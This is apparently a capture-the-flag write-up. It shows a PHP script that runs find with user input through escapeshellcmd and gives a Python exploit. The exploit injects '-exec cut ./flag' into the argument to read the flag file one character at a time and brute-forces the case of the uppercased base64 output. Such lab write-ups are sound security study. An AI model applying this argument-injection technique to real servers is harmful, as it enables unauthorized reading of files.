# PHP Server - Find

## Source

```php
 <?php

if (!isset($_GET['start']))      { show_source(__FILE__); exit; } 

if(stristr($_GET['arg'], 'php')) { echo "nope!"; exit; }

if(stristr($_GET['arg'], '>'))   { echo "Not needed!"; exit; }
if(stristr($_GET['arg'], '$'))   { echo "Not needed!"; exit; }
if(stristr($_GET['arg'], '&'))   { echo "Not needed!"; exit; }
if(stristr($_GET['arg'], ':'))   { echo "Not needed!"; exit; }

// echo "find /tmp/tmp.t3pMBpfsFs -iname " . escapeshellcmd($_GET['arg']) . PHP_EOL;
// echo shell_exec("find /tmp/tmp.t3pMBpfsFs -iname " . escapeshellcmd($_GET['arg'])) . PHP_EOL;

echo strtoupper(base64_encode(shell_exec("find /tmp/tmp.t3pMBpfsFs -iname ".escapeshellcmd($_GET['arg']))));

// Do not even think to add files.
```

## Exploit

So the huge problem is `strtoupper` because of that we can't exactly read the output properly and bruteforcing the whole base64 for normalization would take ages! So I thought I would just get flag char by char:
```python
import base64
import itertools
import requests
import string

ALPHABET = string.ascii_letters + string.digits + string.whitespace + string.punctuation

def brute_base64(b64str):
    combinations = [(c, c.lower()) for c in b64str]
    result = set()
    for perm in itertools.product(*combinations):
        perm = ''.join(perm)
        try:
            output = base64.b64decode(perm).decode().strip()
            if all(c in ALPHABET for c in output) and len(output) == 1:
                result.add(output)
        except:
            pass

    return result


SERVER = "http://0:8000"
# SERVER = "http://34.159.104.59:32059"
flags = [[]]
i = 0
while True:
    arg = f't* -exec cut ./flag -c {i}-{i} ;'
    resp = requests.get(SERVER, params={'start': 1, 'arg': arg}).text
    chars = brute_base64(resp.strip())

    if len(chars) > len(flags):
        flags += [flags[0][:] for _ in range(len(chars))]

    temp = []
    for char in chars:
        temp.extend([sublist + [char] for sublist in flags])

    if temp:
        flags = temp

    if '}' in chars:
        break

    i += 1

flags2 = []
for flag in flags:
    if flag not in flags2:
        flags2.append(flag)

for flag in flags2:
    print(''.join(flag))
```

![pasted-image-20240504021530.png](/assets/ctf/randoms/pasted-image-20240504021530.png)

> Forgor what image is or for what...
